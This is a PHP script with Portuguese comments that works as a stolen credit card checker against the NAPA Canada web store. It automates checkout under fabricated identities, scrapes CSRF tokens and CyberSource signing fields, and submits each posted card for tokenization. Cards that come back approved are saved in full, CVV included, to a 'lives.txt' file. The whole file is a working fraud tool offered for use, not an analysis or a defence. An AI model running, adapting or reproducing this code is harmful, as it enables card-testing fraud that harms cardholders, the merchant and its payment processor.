<?php
/**
 * Script PHP de Checkout NAPA Canada com 8 Requisições.
 * MODIFICADO para receber dados de Cartão via POST para integração com o Dashboard JS.
 * IMPLEMENTAÇÃO: SEM PROXY e Exibição de 'NO_PROXY' no campo IP de Saída.
 * * REQUISITOS FINAIS:
 * - Execução totalmente silenciosa (sem logs de etapa).
 * - Classificação do resultado final com base no AUTH code (AUTH: 00 = Aprovado, Outros = Reprovado).
 * - Saída formatada em três linhas:
 * [STATUS] (APROVADO ou REPROVADO)
 * [CardNumberMascarado]|[ExpMonth]|[ExpYear]|[CVV] DECISÃO DA TRANSAÇÃO: [DECISION] - [MESSAGE] - CODE: [REASON_CODE] - AUTH: [AUTH_RESPONSE] - CVV: [CV_RESULT_RAW] - IP: [IP_DE_SAIDA]
 * * * NOVO REQUISITO: Salvar automaticamente cartões APROVADOS em lives.txt
 */

// 1. Configurações e Variáveis
$url_page = 'https://www.napacanada.com/en/p/NLG124?ir=2&r-src=BR:PDP:SP:Belowproductdescription&ppid=NLG3898';
$url_add_to_cart = 'https://www.napacanada.com/en/cart/add';
$url_cart_page = 'https://www.napacanada.com/en/cart';
$url_contact_info = 'https://www.napacanada.com/en/checkout/multi/pickupContactInfo/choose'; 
$url_validate_billing = 'https://www.napacanada.com/en/checkout/multi/address/validate-billingAddressForm';
$url_add_billing = 'https://www.napacanada.com/en/checkout/multi/address/addNewBillingAddress';
$url_order_summary = 'https://www.napacanada.com/en/checkout/multi/orderSummary/view';
$url_cybersource_tokenization = 'https://secureacceptance.cybersource.com/silent/token/create';

// Adiciona configuração de fuso horário para o timestamp do lives.txt
date_default_timezone_set('America/Sao_Paulo'); 

// *** PROXY REMOVIDO: Executará diretamente do servidor ***

const TIMEOUT_SECS = 30; 

// --------------------------------------------------------------------------------------
// 1.1. RECEBIMENTO DOS DADOS DE ENTRADA VIA POST (DO JAVASCRIPT)
// --------------------------------------------------------------------------------------

if ($_SERVER['REQUEST_METHOD'] !== 'POST' || empty($_POST['card'])) {
    header('Content-Type: text/plain');
    echo "REPROVADO\n";
    echo "ERRO_CRITICO|NA|NA|NA DECISÃO DA TRANSAÇÃO:\tERRO - DADOS DE ENTRADA FALTANDO - CODE: N/A - AUTH: N/A - CVV: N/A - IP: N/A\n";
    exit;
}

// O POST deve vir no formato 'numero|mes|ano|cvv'
$input = explode('|', $_POST['card']);

if (count($input) < 4) {
    header('Content-Type: text/plain');
    echo "REPROVADO\n";
    echo "ERRO_CRITICO|NA|NA|NA DECISÃO DA TRANSAÇÃO:\tERRO - FORMATO DE CARTAO INVALIDO - CODE: N/A - AUTH: N/A - CVV: N/A - IP: N/A\n";
    exit;
}

// Mapeamento dos dados
$card_num = trim($input[0]);
$exp_month = str_pad(trim($input[1]), 2, '0', STR_PAD_LEFT);
$exp_year = trim($input[2]);
$cvv = trim($input[3]);

// Garantir que o ano seja AAAA (Cybersource exige formato MM-AAAA)
if (strlen($exp_year) == 2) {
    $exp_year = '20' . $exp_year;
}

// --------------------------------------------------------------------------------------
// 1.2. RANDOMIZAÇÃO DE DADOS DE USUÁRIO
// --------------------------------------------------------------------------------------

function generate_random_user_data() {
    $firstNames = ['Alex', 'Brian', 'Charles', 'David', 'Edward', 'Frank', 'George', 'Henry', 'Isaac', 'Jack', 'Kevin', 'Liam', 'Noah', 'Oliver', 'Peter', 'Quinn', 'Robert', 'Samuel', 'Thomas', 'Victor'];
    $lastNames = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Miller', 'Davis', 'Garcia', 'Rodriguez', 'Wilson', 'Martinez', 'Anderson', 'Taylor', 'Thomas', 'Hernandez', 'Moore', 'Martin', 'Jackson', 'Thompson', 'White'];
    
    $firstName = $firstNames[array_rand($firstNames)];
    $lastName = $lastNames[array_rand($lastNames)];
    
    // Gera 10 dígitos aleatórios para o telefone
    $phoneDigits = '';
    for ($i = 0; $i < 10; $i++) {
        $phoneDigits .= mt_rand(0, 9);
    }
    // Formata o telefone para (XXX) XXX-XXXX (formato NAPA/Canadá)
    $phoneNoFormatted = sprintf('(%s) %s-%s',
        substr($phoneDigits, 0, 3),
        substr($phoneDigits, 3, 3),
        substr($phoneDigits, 6, 4)
    );
    // Número limpo para o campo phoneNo que não usa máscara
    $phoneNoClean = $phoneDigits;

    // Gera um ID único para o email
    $random_id = substr(md5(uniqid(rand(), true)), 0, 10);
    $email = strtolower("{$firstName}.{$lastName}.{$random_id}@mailinator.com");
    
    return [
        'firstName' => $firstName,
        'lastName' => $lastName,
        'email' => $email,
        'phoneNoClean' => $phoneNoClean, // 7152522222
        'phoneNoFormatted' => $phoneNoFormatted // (715) 252-2222
    ];
}

$user_data = generate_random_user_data();

// --------------------------------------------------------------------------------------
// Implementação da detecção de bandeira e Headers/UserAgent
// --------------------------------------------------------------------------------------
function detect_card_type($card_number) {
    $number = preg_replace('/\D/', '', $card_number);
    if (preg_match('/^5[1-5]/', $number) || preg_match('/^2[2-7][0-9]{2}/', $number)) {
        return '002'; // Mastercard
    }
    if (preg_match('/^4/', $number)) {
        return '001'; // Visa
    }
    return '001'; 
}

$detected_card_type = detect_card_type($card_num); 

$card_data = [
    'card_number' => $card_num, 
    'card_type' => $detected_card_type, 
    'card_expiry_date' => "{$exp_month}-{$exp_year}", // MM-AAAA
    'card_cvn' => $cvv, 
    'submit' => 'Submit',
    'credential_stored_on_file' => 'true',
];

$user_agent = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36';
$facility_id = '1000378';

$headers_get = [
    'authority: www.napacanada.com', 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language: pt-BR,pt;q=0.9', 'cache-control: max-age=0', 'sec-fetch-dest: document',
    'sec-fetch-mode: navigate', 'sec-fetch-site: same-origin', 'upgrade-insecure-requests: 1',
];

$headers_post_contact = [ 
    'authority: www.napacanada.com', 'accept: application/json, text/javascript, */*; q=0.01', 
    'accept-language: pt-BR,pt;q=0.9', 'content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'origin: https://www.napacanada.com', 'sec-fetch-dest: empty', 'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin', 'x-requested-with: XMLHttpRequest',
];

$headers_cybersource_post = [
    'authority: secureacceptance.cybersource.com', 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language: pt-BR,pt;q=0.9', 'cache-control: max-age=0', 'content-type: application/x-www-form-urlencoded',
    'origin: https://www.napacanada.com', 'sec-fetch-dest: document', 'sec-fetch-mode: navigate',
    'sec-fetch-site: cross-site', 'sec-fetch-user: ?1', 'upgrade-insecure-requests: 1',
];

// Variáveis de Resultado e Token
$summary_page_html = null;
$billing_post_response_json = null; 
$csrf_token_1 = ''; 
$csrf_token_2 = ''; 
$cybersource_data = []; 
$cybersource_tokenization_response = null;

// Garante que o arquivo de cookies comece "novo" para cada execução
$cookieFile = 'napa_session_cookies_' . substr(md5(microtime()), 0, 8) . '.txt'; 

// --------------------------------------------------------------------------------------
// 2. FUNÇÕES AUXILIARES
// --------------------------------------------------------------------------------------

/** Função de Execução de Requisição cURL (SEM Proxy) */
function execute_curl_request($url, $method, $baseHeaders, $referer, $user_agent, $cookieFile, $postData = null) {
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
    curl_setopt($ch, CURLOPT_HEADER, true); 
    $fullHeaders = array_merge($baseHeaders, ["referer: " . $referer]);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $fullHeaders);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30); 
    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
    
    // *** Configuração de Proxy Removida ***

    if (strtoupper($method) === 'POST' && $postData !== null) {
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    }
    $response = curl_exec($ch);
    $error = curl_error($ch);
    $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    $headers = substr($response, 0, $header_size);
    $html = substr($response, $header_size);
    curl_close($ch);
    
    return ['html' => $html, 'error' => $error, 'headers' => $headers];
}

// Funções de Payload POST
function prepare_post_data_add_to_cart($csrf_token, $facility_id) {
    $post_data = [
        'basePriceDisplayed' => '1.59', 'productCodePost' => 'NLG_124', 'name' => 'NAPA Lighting',
        'facilityId' => $facility_id, 'qty' => '1', 'CSRFToken' => $csrf_token, 'brand' => 'NAPA',
        'orderType' => 'rol', 'description' => 'NAPA Lamps Incandescent Bulb', 'eRecSpec' => 'NLQ124', 
        'lineAbbr' => 'NLG', 'partNumber' => '124', 'inventory' => '0', 
    ];
    return http_build_query($post_data);
}

// Usa dados aleatórios do usuário
function prepare_post_data_contact_info($csrf_token, $user_data) {
    $post_data = [
        'firstName' => $user_data['firstName'], 
        'lastName' => $user_data['lastName'],
        'email' => $user_data['email'], 
        'phoneNo' => $user_data['phoneNoClean'], // Número limpo, sem máscara
        'additionalPickup' => 'false', 'addlPickupFirstName' => '',
        'addlPickupLastName' => '', 'addlPickupEmail' => '',
        'addlPickupPhoneNo' => '', 'CSRFToken' => $csrf_token, 
    ];
    return http_build_query($post_data);
}

// Usa dados aleatórios do usuário e endereço fixo
function prepare_post_data_billing_address($csrf_token, $user_data) {
    $post_data = [
        'billing_addressId' => 'master', 'isBillingFormFilled' => 'true',
        'billing_billingAddress' => 'true', 
        'billing_firstName' => $user_data['firstName'], // Aleatório
        'billing_lastName' => $user_data['lastName'],   // Aleatório
        'billing_addressType' => 'R',
        // *** ENDEREÇO FIXO ***
        'billing_line1' => '10020 new york', 
        'billing_line2' => '',
        'billing_townCity' => 'Mew york', 
        'billing_regionIso' => 'CA-NT', 
        'billing_countryIso' => 'CA',
        'billing_postcode' => 'A1B2C3',
        'billing_phoneNo' => $user_data['phoneNoFormatted'], // Aleatório, formatado
        'CSRFToken' => $csrf_token,
    ];
    return http_build_query($post_data);
}


// Funções de Extração de Dados
function extract_cybersource_fields($json_string, $html_string = null) {
    $required_fields = [
        'profile_id', 'access_key', 'transaction_uuid', 'signature',
        'bill_to_address_state', 'bill_to_email', 'amount', 'signed_date_time',
        'bill_to_address_postal_code', 'reference_number', 'bill_to_forename',
        'bill_to_surname', 'bill_to_phone', 'currency', 'bill_to_address_line1',
        'bill_to_address_city', 'e_commerce_indicator', 'locale', 'transaction_type',
        'payment_method', 'bill_to_address_country', 'signed_field_names', 'unsigned_field_names'
    ];
    $fields = [];
    $data = json_decode($json_string, true);
    if ($data && is_array($data)) {
        $fields = array_intersect_key($data, array_flip($required_fields));
    }
    if (empty($fields) && $html_string !== null) {
        $pattern = '/<input[^>]+name=["\']?('. implode('|', $required_fields) .')["\']?[^>]+value=["\']([^"\']+)["\']/i';
        if (preg_match_all($pattern, $html_string, $matches, PREG_SET_ORDER)) {
            foreach ($matches as $match) {
                $fieldName = $match[1];
                $fieldValue = html_entity_decode($match[2]); 
                $fields[$fieldName] = $fieldValue;
            }
        }
    }
    if (!isset($fields['amount']) && $html_string !== null) {
        if (preg_match('/class=["\']checkout-order-total["\'][^>]*>\s*\$([^<]+)/i', $html_string, $matches)) {
            $fields['amount'] = trim(str_replace(',', '', $matches[1])); 
        }
    }
    return $fields;
}

function extract_cybersource_results_for_line($html_string) {
    $fields_to_extract = [
        'req_card_number', 'req_card_expiry_date', 
        'reason_code', 'auth_response', 'decision', 'message', 'auth_cv_result_raw'
    ];
    $results = [];
    $pattern = '/<input[^>]+name=["\']?('. implode('|', $fields_to_extract) .')["\']?[^>]+value=["\']([^"\']+)["\']/i';

    if (preg_match_all($pattern, $html_string, $matches, PREG_SET_ORDER)) {
        foreach ($matches as $match) {
            $fieldName = $match[1];
            $fieldValue = html_entity_decode($match[2]); 
            $results[$fieldName] = $fieldValue;
        }
    }

    if (isset($results['req_card_expiry_date'])) {
        $date_parts = explode('-', $results['req_card_expiry_date']);
        if (count($date_parts) === 2) {
            $results['req_exp_month'] = $date_parts[0]; // MM
            $results['req_exp_year'] = $date_parts[1];  // AAAA
        }
    }
    return $results;
}


// --------------------------------------------------------------------------------------
// 3. FLUXO PRINCIPAL
// --------------------------------------------------------------------------------------

// *** ATUALIZADO: Usando 'NO_PROXY' para o IP de saída ***
$current_ip = 'NO_PROXY'; 

// Certifica-se de remover o arquivo de cookie temporário no final
register_shutdown_function(function() use ($cookieFile) {
    if (file_exists($cookieFile)) {
        @unlink($cookieFile);
    }
});

// 1. GET: Obtendo Sessão e CSRF Token 1
$result_get_page = execute_curl_request($url_page, 'GET', $headers_get, $url_page, $user_agent, $cookieFile);
$html_page = $result_get_page['html'];
if (preg_match('/ACC\.config\.CSRFToken\s*=\s*["\']([^"\']+)["\']/', $html_page, $matches)) $csrf_token_1 = $matches[1];

// 2. POST: Adicionar ao Carrinho
$post_data_string = prepare_post_data_add_to_cart($csrf_token_1, $facility_id);
execute_curl_request($url_add_to_cart, 'POST', $headers_post_contact, $url_page, $user_agent, $cookieFile, $post_data_string);

// 3. GET: Visualizar a Página do Carrinho
execute_curl_request($url_cart_page, 'GET', $headers_get, $url_add_to_cart, $user_agent, $cookieFile);

// 4. GET: Acessar a Página de Contato (Para extrair CSRF 2)
$result_get_contact = execute_curl_request($url_contact_info, 'GET', $headers_get, $url_cart_page, $user_agent, $cookieFile);
$contact_page_html = $result_get_contact['html'];
if (preg_match('/<input[^>]+name="CSRFToken"[^>]+value="([^"]+)"/i', $contact_page_html, $matches)) $csrf_token_2 = $matches[1]; else $csrf_token_2 = $csrf_token_1;

// 5. POST: Submeter as Informações de Contato
// USANDO DADOS ALEATÓRIOS
$referer_billing = $url_contact_info; 
$post_data_string = prepare_post_data_contact_info($csrf_token_2, $user_data);
execute_curl_request($url_contact_info, 'POST', $headers_post_contact, $url_contact_info, $user_agent, $cookieFile, $post_data_string);

// 5.1. POST: Validar Endereço de Cobrança
// USANDO DADOS ALEATÓRIOS
$billing_data_string = prepare_post_data_billing_address($csrf_token_2, $user_data);
execute_curl_request($url_validate_billing, 'POST', $headers_post_contact, $referer_billing, $user_agent, $cookieFile, $billing_data_string);

// 5.2. POST: Submeter Novo Endereço de Cobrança (Captura JSON para extração)
// USANDO DADOS ALEATÓRIOS
$result_add_billing = execute_curl_request($url_add_billing, 'POST', $headers_post_contact, $referer_billing, $user_agent, $cookieFile, $billing_data_string);
$billing_post_response_json = $result_add_billing['html'];

// 6. GET: Visualizar a Página de Resumo do Pedido (Payment Page)
$referer_summary = $url_contact_info; 
$result_get_summary = execute_curl_request($url_order_summary, 'GET', $headers_get, $referer_summary, $user_agent, $cookieFile);
$summary_page_html = $result_get_summary['html'];


// =====================================================================
// 7. EXTRAÇÃO DOS DADOS DO CYBERSOURCE
// =====================================================================
$cybersource_data = extract_cybersource_fields($billing_post_response_json, $summary_page_html);

// ATUALIZA DADOS ALEATÓRIOS NO PAYLOAD CYBERSOURCE CASO TENHA FALHADO A EXTRAÇÃO
$cybersource_data['bill_to_forename'] = $cybersource_data['bill_to_forename'] ?? $user_data['firstName'];
$cybersource_data['bill_to_surname'] = $cybersource_data['bill_to_surname'] ?? $user_data['lastName'];
$cybersource_data['bill_to_email'] = $cybersource_data['bill_to_email'] ?? $user_data['email'];
$cybersource_data['bill_to_phone'] = $cybersource_data['bill_to_phone'] ?? $user_data['phoneNoClean'];


if (empty($cybersource_data)) {
    header('Content-Type: text/plain');
    echo "REPROVADO\n";
    echo "{$card_num}|{$exp_month}|{$exp_year}|{$cvv} DECISÃO DA TRANSAÇÃO:\tERRO - EXTRAÇÃO DE DADOS FALHOU - CODE: N/A - AUTH: N/A - CVV: N/A - IP: {$current_ip}\n";
    exit(1); 
}


// =====================================================================
// 8. POST: TOKENIZAÇÃO CYBERSOURCE
// =====================================================================
$cybersource_payload_data = array_merge($cybersource_data, $card_data);
$payload_cybersource = http_build_query($cybersource_payload_data);
$referer_cybersource = 'https://www.napacanada.com/'; 

$result_tokenization = execute_curl_request(
    $url_cybersource_tokenization, 
    'POST', 
    $headers_cybersource_post, 
    $referer_cybersource, 
    $user_agent, 
    $cookieFile, 
    $payload_cybersource
);

$cybersource_tokenization_response = $result_tokenization['html'];


// --------------------------------------------------------------------------------------
// 4. CLASSIFICAÇÃO E EXIBIÇÃO DA RESPOSTA FINAL (FORMATO FILTRÁVEL)
// --------------------------------------------------------------------------------------
header('Content-Type: text/plain');

// Dados do Cartão Original
$full_card_info = "{$card_num}|{$exp_month}|{$exp_year}|{$cvv}";


if ($result_tokenization['error']) {
    // Erro de conexão cURL
    echo "REPROVADO\n";
    // *** Saída com o IP de erro ***
    echo "{$full_card_info} DECISÃO DA TRANSAÇÃO:\tERRO - CURL FALHOU - CODE: N/A - AUTH: N/A - CVV: N/A - IP: {$current_ip}\n";
} else {
    
    // Extrai os campos necessários
    $final_results = extract_cybersource_results_for_line($cybersource_tokenization_response);
    
    // Define valores padrão
    $decision = $final_results['decision'] ?? 'NA';
    $message = $final_results['message'] ?? 'NA';
    $reason_code = $final_results['reason_code'] ?? 'N/A';
    $auth_response = $final_results['auth_response'] ?? 'N/A';
    $cv_result = $final_results['auth_cv_result_raw'] ?? 'N/A';
    
    // CLASSIFICAÇÃO PRINCIPAL: APROVADO se AUTH for '00'
    if ($auth_response === '00') {
        $status_header = "APROVADO";
        
        // =====================================================================
        // NOVO: Lógica para salvar o cartão Live em lives.txt
        // =====================================================================
        $live_file = 'lives.txt';
        $timestamp = date("Y-m-d H:i:s");
        
        // Formata a linha no formato que você deseja salvar no arquivo: [TIMESTAMP] CC|MM|YYYY|CVV
        $content_to_save = "[" . $timestamp . "] " . $full_card_info . "\n";
        
        // Salva o cartão no arquivo
        // Usa FILE_APPEND para adicionar ao final e LOCK_EX para evitar problemas de concorrência
        @file_put_contents($live_file, $content_to_save, FILE_APPEND | LOCK_EX);
        // =====================================================================
        
    } else {
        $status_header = "REPROVADO";
    }

    // Constrói a linha de saída final no formato solicitado
    $output_line = sprintf(
        "%s DECISÃO DA TRANSAÇÃO:\t%s - %s - CODE: %s - AUTH: %s - CVV: %s - IP: %s",
        $full_card_info,
        $decision,
        $message,
        $reason_code,
        $auth_response,
        $cv_result,
        $current_ip // O IP é 'NO_PROXY'
    );

    $output_line = trim(strip_tags($output_line));
    
    // Imprime o cabeçalho de status
    echo $status_header . "\n";
    
    // Imprime a linha formatada
    echo $output_line;
}
?>